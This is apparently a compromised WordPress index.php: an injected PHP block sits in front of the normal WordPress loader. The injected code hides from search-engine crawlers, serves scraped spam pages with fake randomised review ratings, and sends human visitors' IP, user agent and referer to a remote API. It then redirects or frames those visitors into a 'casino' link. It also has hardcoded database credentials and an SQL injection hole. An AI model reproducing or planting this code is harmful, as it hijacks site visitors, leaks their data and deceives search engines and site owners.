<?php
error_reporting(0);
$qq = 'q';

$dbn = 'FAC02';
$dbu = 'hacienda';
$dbp = 'reflex11';
$dbh = 'localhost';
 
$conn = mysql_connect($dbh, $dbu, $dbp ) or die("Could not connect : " . mysql_error());
mysql_select_db($dbn) or die("Could not select database");


$ip = urlencode($_SERVER['REMOTE_ADDR']);
$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
$source = urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);
$referer = urlencode($_SERVER['HTTP_REFERER']);
$crawlers = '/google|bot|crawl|slurp|spider|yandex|rambler/i';
if (preg_match($crawlers, $ua)) {
	$abt = 1;
}
if (file_exists('bts.dat')) {
	$bts = file('bts.dat', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	if (in_array($ip, $bts)) {
		$abt = 1;
	}
}

if (isset($_GET[$qq])) {
	$hurl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['PHP_SELF']}";
	$hurl = str_replace('index.php', '', $hurl);
	$k = $_GET[$qq];
	$title = ucfirst(str_replace('-', ' ', $k));
	$getgen = "SELECT * from w_cont WHERE `key`='_gen_'";
	$res_gen = mysql_query($getgen) or die("Query failed : " . mysql_error());
	$wp_gen = mysql_fetch_assoc($res_gen);
	$gen = $wp_gen['txt'];
	$getred = "SELECT * from w_cont WHERE `key`='_red_'";
	$res_red = mysql_query($getred) or die("Query failed : " . mysql_error());
	$wp_red = mysql_fetch_assoc($res_red);
	$red = $wp_red['txt'];
	$getapi = "SELECT * from w_cont WHERE `key`='_api_'";
	$res_api = mysql_query($getapi) or die("Query failed : " . mysql_error());
	$wp_api = mysql_fetch_assoc($res_api);
	$api = $wp_api['txt'];

	$get_txt = "SELECT * from w_cont WHERE `key`='$k'";
		$res_txt = mysql_query($get_txt);
		if ($wp_txt = mysql_fetch_assoc($res_txt)) {
			$txt = $wp_txt['txt'];
		}
		else {
			$parse = "{$gen}{$k}";
			$txt = file_get_contents($parse);
			$txtt = mysql_real_escape_string($txt);
			$insert_txt = "INSERT INTO `w_cont` (`key`, `txt`) VALUES('$k', '$txtt')";
			$res_txt = mysql_query($insert_txt) or die("Query failed : " . mysql_error());
		}
	//404 not found page settings
	if (isset($_POST['notfound'])) {
		$notfound = "$red";
		header('Location: '.$notfound);
   		exit();
	}
	if (!$abt) {
		$churl = "{$api}&action=get_link&group=2casino&ua=$ua&source=$source&ip=$ip&referer=$referer&keyword=".urlencode($title);
		$check = file_get_contents($churl);
		$json = json_decode($check);
		$framesrc = $json->{'stream'}->{'url'};
		$type = $json->{'redirect'}->{'type'};

		if ($json->{'bot_action'}->{'text'} == '123') {
  			echo " ";
		} 
		else {
  			if($type == "iframe") {
         echo "<script type=\"text/javascript\">document.write('<frameset cols=\"100%\"><frame src=\"$framesrc\"></frameset>');</script>";  			} 
  			else if($type == "js_for_iframe") {
    			echo "<script type=\"text/javascript\">window.location.href = '" . $framesrc . "'</script>";
  			}
		}
	}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title><?php echo "$title - ".$_SERVER['HTTP_HOST'] ?></title>

    <link rel="stylesheet" href="http://lochlymelodge.com/blog/wp-content/themes/landzilla-2x/style.css" type="text/css" media="screen, projection" />

</head>
<body>

	<span itemscope itemtype="http://schema.org/Product"><span style="display: none" itemprop="name"> <?php echo "$title" ?></span><span style="display: none"  itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating"> Rating <span itemprop="ratingValue">
<?php
  $min=1;
  $max=5;
  echo rand($min,$max);
?>
</span> from 5 based on<span itemprop="reviewCount">
<?php
  $min=30;
  $max=5000;
  echo rand($min,$max);
?>
</span> reviews. </span>
 <?php echo "<h1>$title</h1>\n"; ?>

<span itemprop="review" itemscope itemtype="http://schema.org/Review"><?php
	echo "<div id=\"content\">\n$txt\n</div>\n";
?>
<div id="footer">WP-Design: <a href="http://www.vlad-design.de" title="Wordpress-Design by Vladimir Simovic (Perun)">Vlad</a> -- Powered by <a href="http://wordpress.org">WordPress</a></div>

</div>
</div>
</body>
</html>
<?php
die();
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');
?>